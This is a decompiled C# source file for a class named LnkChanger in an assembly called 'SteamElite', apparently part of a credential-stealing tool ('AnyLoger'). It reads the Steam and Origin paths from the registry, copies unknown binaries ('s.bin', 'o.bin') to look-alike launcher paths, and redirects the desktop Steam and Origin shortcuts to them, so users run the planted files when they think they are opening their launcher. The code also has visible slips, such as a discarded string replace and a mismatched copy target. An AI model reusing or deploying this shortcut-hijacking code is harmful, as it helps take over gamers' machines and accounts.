// Decompiled with JetBrains decompiler
// Type: AnyLoger.LnkChanger
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using IWshRuntimeLibrary;
using Microsoft.CSharp.RuntimeBinder;
using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace AnyLoger
{
  internal class LnkChanger
  {
    private static string steam
    {
      get
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
        string str = registryKey.GetValue("SteamPath").ToString() + "/Steam..exe";
        registryKey.Close();
        return str;
      }
    }

    private static string origin
    {
      get
      {
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Wow6432Node\\Origin", false))
        {
          string str = registryKey.GetValue("ClientPath").ToString();
          str.Replace(".exe", "..exe");
          return str;
        }
      }
    }

    public static void Change(string name)
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      if (File.Exists(folderPath + "/Steam.lnk"))
      {
        File.Copy("s.bin", LnkChanger.origin);
        object Index = (object) "Desktop";
        // ISSUE: variable of a compiler-generated type
        WshShell instance = (WshShell) Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
        // ISSUE: reference to a compiler-generated field
        if (LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof (string), typeof (LnkChanger)));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated method
        string PathLink = LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__0.Target((CallSite) LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__0, instance.SpecialFolders.Item(ref Index)) + "\\Steam.lnk";
        // ISSUE: reference to a compiler-generated field
        if (LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__1 == null)
        {
          // ISSUE: reference to a compiler-generated field
          LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, IWshShortcut>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof (IWshShortcut), typeof (LnkChanger)));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated method
        // ISSUE: variable of a compiler-generated type
        IWshShortcut wshShortcut = LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__1.Target((CallSite) LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__1, instance.CreateShortcut(PathLink));
        wshShortcut.TargetPath = LnkChanger.steam;
        // ISSUE: reference to a compiler-generated method
        wshShortcut.Save();
      }
      if (!File.Exists(folderPath + "/Origin.lnk"))
        return;
      File.Copy("o.bin", LnkChanger.origin);
      object Index1 = (object) "Desktop";
      // ISSUE: variable of a compiler-generated type
      WshShell instance1 = (WshShell) Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")));
      // ISSUE: reference to a compiler-generated field
      if (LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof (string), typeof (LnkChanger)));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      string PathLink1 = LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__2.Target((CallSite) LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__2, instance1.SpecialFolders.Item(ref Index1)) + "\\Origin.lnk";
      // ISSUE: reference to a compiler-generated field
      if (LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__3 == null)
      {
        // ISSUE: reference to a compiler-generated field
        LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, IWshShortcut>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof (IWshShortcut), typeof (LnkChanger)));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      // ISSUE: variable of a compiler-generated type
      IWshShortcut wshShortcut1 = LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__3.Target((CallSite) LnkChanger.\u003C\u003Eo__4.\u003C\u003Ep__3, instance1.CreateShortcut(PathLink1));
      wshShortcut1.TargetPath = LnkChanger.origin;
      // ISSUE: reference to a compiler-generated method
      wshShortcut1.Save();
    }
  }
}
